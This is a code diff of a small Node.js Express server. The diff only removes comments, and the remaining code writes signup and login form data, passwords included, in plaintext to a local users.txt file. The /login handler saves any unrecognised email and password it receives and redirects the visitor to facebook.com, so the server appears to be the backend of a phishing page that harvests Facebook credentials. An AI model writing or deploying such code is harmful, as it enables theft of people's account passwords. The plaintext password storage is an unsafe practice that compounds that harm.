@@ -5,10 +5,8 @@ const path = require('path');
 const app = express();
 const PORT = 3000;
 
-// Use a single declaration for filePath
 const filePath = path.join(__dirname, 'users.txt');
 
-// Ensure the file exists by creating it if it doesn't
 if (!fs.existsSync(filePath)) {
   fs.writeFileSync(filePath, '');
 }
@@ -16,7 +14,6 @@ if (!fs.existsSync(filePath)) {
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname)));
 
-// Handle signup form submission
 app.post('/signup', (req, res) => {
   const { firstName, lastName, email, password, phone } = req.body;
   const userData = `Name: ${firstName} ${lastName}\nEmail: ${email}\nPassword: ${password}\nPhone: ${phone}\n\n`;
@@ -32,7 +29,6 @@ app.post('/signup', (req, res) => {
   });
 });
 
-// Handle login form submission
 app.post('/login', (req, res) => {
   const { identifier, password } = req.body;
   fs.readFile(filePath, 'utf8', (err, data) => {
@@ -51,7 +47,6 @@ app.post('/login', (req, res) => {
     if (userExists) {
       res.redirect('https://www.facebook.com');
     } else {
-      // Save new user data
       const userData = `Email: ${identifier}\nPassword: ${password}\nPhone: ${identifier}\n\n`;
       fs.appendFile(filePath, userData, (err) => {
         if (err) {
